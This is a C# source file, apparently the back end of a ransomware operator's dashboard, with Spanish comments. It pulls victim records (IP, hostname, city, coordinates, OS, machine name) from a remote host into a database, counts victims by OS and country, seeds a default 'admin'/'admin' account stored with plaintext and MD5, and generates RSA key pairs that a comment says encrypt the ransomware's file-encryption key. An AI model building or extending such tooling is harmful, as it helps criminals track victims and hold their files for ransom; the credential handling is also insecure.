using BaphoDashBoard.DTO;
using BaphoDashBoard.Models;
using Microsoft.EntityFrameworkCore;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace BaphoDashBoard.DAL.Services
{
    public class BaseService
    {
        protected readonly MyLocalDatabase _context;
        public BaseService(MyLocalDatabase context)
        {
            _context = context;
        }

        public async Task<AppResult> GetHostData()
        {
            AppResult result = new AppResult();
            try
            {
                //obtengo la data de las victimas la cual se aloja en nuestro host en formato json
                WebRequest request =  WebRequest.Create("https://baphomettest.000webhostapp.com/data.txt");
                WebResponse response =  request.GetResponse();
                Stream data = response.GetResponseStream();
                string content = String.Empty;
                //obtengo todos los records ya guardados en mi DB para luego comparar con la data obtenida, de esta manera no guardo records repetidos.
                var db_records = await _context.VictimDetail.ToListAsync();

                using (StreamReader sr = new StreamReader(data))
                {
                    content = sr.ReadToEnd();
                    //Creo un array de cada objeto(cada modelo de informacion de mi victima).
                    //Debido a que este no viene como un json debemos anadirle algunos caracteres para que si lo sea.
                    var json_string = content.Replace("}", "},");
                    json_string = "[" + json_string + "]";
                    var object_array = JsonConvert.DeserializeObject<List<VictimDetailsDTO>>(json_string);
                    //Una vez tengo mi lista de victimas paso a rrecorerla una a una para saber que record guardo y cual no.
                    foreach (var victim_object in object_array)
                    {
                        if(victim_object != null)
                        { 
                            var record_exist = false;
                            //Verifico si el record de esta victima ya existe en mi base de datos.
                            foreach(var db_record in db_records)
                            {
                                var unique_id = victim_object.MachineName;
                                if(db_record.MachinName == unique_id)
                                {
                                    record_exist = true;
                                    break;
                                }
                            }
                            //Si el record es false, significa que no existe. Entonces procedo a guardar la info.
                            if(record_exist == false)
                            {
                                var victimInfo = victim_object;
                                if (victimInfo != null)
                                {
                                    string[] Ubication = victimInfo.Localitation.Split(",");
                                    VictimDetail victim = new VictimDetail()
                                    {
                                        Ip = victimInfo.Ip,
                                        Hostname = victimInfo.Hostname,
                                        City = victimInfo.City,
                                        Region = victimInfo.Region,
                                        Country = victimInfo.Country,
                                        Lat = Ubication[0],
                                        Lng = Ubication[1],
                                        PostalCode = victimInfo.PostalCode,
                                        MachineOS = victimInfo.MachineOs,
                                        MachinName = victimInfo.MachineName
                                    };
                                    _context.VictimDetail.Add(victim);
                                    _context.SaveChanges();

                                    result.success = true;
                                    result.message = "Updated Data";
                                }
                                else
                                {
                                    result.success = false;
                                    result.message = "No new data found";
                                }
                            }
                            else
                            {
                                result.message = "No new data found";
                            }
                        }
                        else
                        {
                            Console.WriteLine("object null");
                        }
                    }
                }
            }
            catch(Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;
        }

        public async Task<AppResult<VictimsHomeInfoDTO>> GetVictimData()
        {
            AppResult<VictimsHomeInfoDTO> result = new AppResult<VictimsHomeInfoDTO>();
            try
            {
                var query = await _context.VictimDetail.ToListAsync();
                var microsoft_reference = new[] {"Windows", "windows","Microsoft","mocrisoft"};
                var linux_refrence = new[] {"Linux","linux", "Debian", "Ubuntu"};

                foreach (var victim_info in query)
                {
                    VictimDetailsDTO victim = new VictimDetailsDTO()
                    {
                        Id = victim_info.Id,
                        Ip = victim_info.Ip,
                        Hostname = victim_info.Hostname,
                        City = victim_info.City,
                        Region = victim_info.Region,
                        Country = victim_info.Country,
                        Latitude = victim_info.Lat,
                        Longitude = victim_info.Lng,
                        PostalCode = victim_info.PostalCode,
                        MachineOs = victim_info.MachineOS,
                        MachineName = victim_info.MachinName
                    };
                    result.MRObject.VictimDetails.Add(victim);
                }

                result.MRObject.WindowsOS = query.Where(x => microsoft_reference.Any(x.MachineOS.Contains)).Count();
                result.MRObject.LinuxOs = query.Where(x => linux_refrence.Any(x.MachineOS.Contains)).Count();
                result.MRObject.Countries = query.GroupBy(x => x.Country).Select(s => s.First()).Count();
                result.MRObject.Cities = query.GroupBy(x => x.City).Select(s => s.First()).Count();
                result.MRObject.Machines = query.Count;
                result.MRObject.Alldata = result.MRObject.VictimDetails;
                 
            }
            catch(Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;
        }

        public async Task<List<ChartDTO>> GetmachinesOs()
        {
            List<ChartDTO> result = new List<ChartDTO>();
            try
            {
                var microsoft_reference = new[] { "Windows", "windows", "Microsoft", "mocrisoft" };
                var linux_refrence = new[] { "Linux", "linux","Debian", "debian", "Ubuntu" };
                var list = await _context.VictimDetail.Select(x => new VictimDetail()
                {
                    MachineOS = x.MachineOS
                }).ToArrayAsync();

                double porcent = 0;
                double all_sum = list.Count();

                result.Add(new ChartDTO(){Name = "Windows", Value = list.Where(x => microsoft_reference.Any(x.MachineOS.Contains)).Count()});
                result.Add(new ChartDTO(){Name = "Linux", Value = list.Where(x => linux_refrence.Any(x.MachineOS.Contains)).Count()});

                foreach(var machine_os in result)
                {
                    double value = machine_os.Value / all_sum;
                    if(Double.IsNaN(value))
                    {
                        value = 0;
                    }
                    porcent = Math.Round(value * 100);
                    machine_os.Porcent = Convert.ToInt32(porcent);
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return result;
        }

        public AppResult StartUser()
        {
            AppResult result = new AppResult();
            try
            {
                var hash = "";
                using (MD5 mD5 = MD5.Create())
                {
                    hash = GetMd5Hash(mD5, "admin");
                }

                var admin = new Administrators()
                {
                    Username = "admin",
                    Password = "admin",
                    PasswordHash = hash
                };
                _context.Administrators.Add(admin);
                _context.SaveChanges();

                result.success = true;
                result.message = "Your administrator account has been created successfully";
            }
            catch (Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }

            return result;
        }

        //genero las llaves rsa, encargadas de cifrar llave simetrica que genera el ransomware para cifrar los archivos.
        public RsaKeysDTO GenerateRsaKeys()
        {
            RsaKeysDTO result = new RsaKeysDTO();
            try
            {
                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
                result.PublicKey = rsa.ToXmlString(false);
                result.PrivateKey = rsa.ToXmlString(true);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return result;
        }

        static string GetMd5Hash(MD5 md5Hash, string input)
        {
            // Convert the input string to a byte array and compute the hash.
            byte[] data = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input));

            // Create a new Stringbuilder to collect the bytes
            // and create a string.
            StringBuilder sBuilder = new StringBuilder();

            // Loop through each byte of the hashed data 
            // and format each one as a hexadecimal string.
            for (int i = 0; i < data.Length; i++)
            {
                sBuilder.Append(data[i].ToString("x2"));
            }
            // Return the hexadecimal string.
            return sBuilder.ToString();
        }
    }
}
